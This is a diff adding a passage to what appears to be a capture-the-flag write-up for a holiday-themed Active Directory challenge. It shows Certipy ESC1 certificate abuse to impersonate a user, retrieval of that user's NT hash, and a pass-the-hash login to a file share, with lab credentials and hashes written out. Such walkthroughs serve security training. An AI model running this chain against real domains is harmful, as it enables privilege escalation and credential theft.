@@ -744,7 +744,7 @@ As per the TODO List Alabster is planning to implement ${\color{green}Gingerbrea
 </details>
 
 ### Active Directory
-Difficult: 🎄🎄🎄🎄🎄
+Difficult: 🎄🎄🎄🎄
 
 Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?
 
@@ -839,5 +839,90 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved text output to '20240118082058_Certipy.txt'
 [*] Saved JSON output to '20240118082058_Certipy.json'
 ````
- 
+The output of Certipy shows that it is vulnerable to ESC2
+[!] Vulnerabilities
+ESC1 : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+   
+ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).
+For ESC1, we can request a certificate based on the vulnerable certificate template and specify an arbitrary UPN or DNS SAN with the -upn and -dns parameter, respectively.
+
+````
+alabaster@ssh-server-vm:~$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -dc-ip 10.0.0.53 -template NorthPoleUsers -upn alabaster@northpole.local -dns npdc01.northpole.local
+````
+````
+alabaster@ssh-server-vm:~$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -dc-ip 10.0.0.53 -template NorthPoleUsers -upn alabaster@northpole.local
+````
+````
+alabaster@ssh-server-vm:~$ certipy auth -pfx alabaster.pfx -dc-ip 10.0.0.53 -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: alabaster@northpole.local
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
+````
+Could not get anything for alabaster let's search if we can find any other used for whom we can request a certificate.
+````
+alabaster@ssh-server-vm:~/impacket$ GetADUsers.py -all -dc-ip 10.0.0.53 'northpole.local/elfy:J4`ufC49/J4766'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Querying 10.0.0.53 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+alabaster                                             2024-01-19 01:02:52.517117  2024-01-19 01:16:50.870757 
+Guest                                                 <never>              <never>             
+krbtgt                                                2024-01-19 01:10:45.513065  <never>             
+elfy                                                  2024-01-19 01:13:05.023950  2024-01-19 21:58:23.893726 
+wombleycube                                           2024-01-19 01:13:05.164594  2024-01-19 21:56:04.315004 
+````
+Wombleycube could help us, let's relauch certipy with Wombley
+````
+alabaster@ssh-server-vm:~$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -dc-ip 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 22
+[*] Got certificate with UPN 'wombleycube@northpole.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'wombleycube.pfx'
+alabaster@ssh-server-vm:~$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: wombleycube@northpole.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'wombleycube.ccache'
+[*] Trying to retrieve NT hash for 'wombleycube'
+[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+````
+Let's connect to the fileshare with wombleycube hash and read what is inside ** super_secret_research**
+````
+alabaster@ssh-server-vm:~/impacket$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 northpole.local/wombleycube@10.0.0.53
+# use FileShare
+# ls
+drw-rw-rw-          0  Fri Jan 19 01:14:00 2024 .
+drw-rw-rw-          0  Fri Jan 19 01:13:56 2024 ..
+-rw-rw-rw-     701028  Fri Jan 19 01:13:59 2024 Cookies.pdf
+-rw-rw-rw-    1521650  Fri Jan 19 01:14:00 2024 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Fri Jan 19 01:14:00 2024 SignatureCookies.pdf
+drw-rw-rw-          0  Fri Jan 19 01:13:59 2024 super_secret_research
+-rw-rw-rw-        165  Fri Jan 19 01:14:00 2024 todo.txt
+# cd super_secret_research
+# ls
+drw-rw-rw-          0  Fri Jan 19 01:14:00 2024 .
+drw-rw-rw-          0  Fri Jan 19 01:14:00 2024 ..
+-rw-rw-rw-        231  Fri Jan 19 01:14:00 2024 InstructionsForEnteringSatelliteGroundStation.txt
+# get InstructionsForEnteringSatelliteGroundStation.txt
+````
+The task is completed by giving the name of the file.
+
+The text file contained
+
+$\color{yellow}{\textsf{Note to self:}}$
+
+$\color{gold}{\textsf{To enter the Satellite Ground Station (SGS), say the following into the speaker:}}$
+
+$\color{yellow}{\textsf{And he whispered, 'Now I shall be out of sight;}}$
+$\color{gold}{\textsf{So through the valley and over the height.'}}$
+$\color{yellow}{\textsf{And he'll silently take his way.}}$
+
 </details>
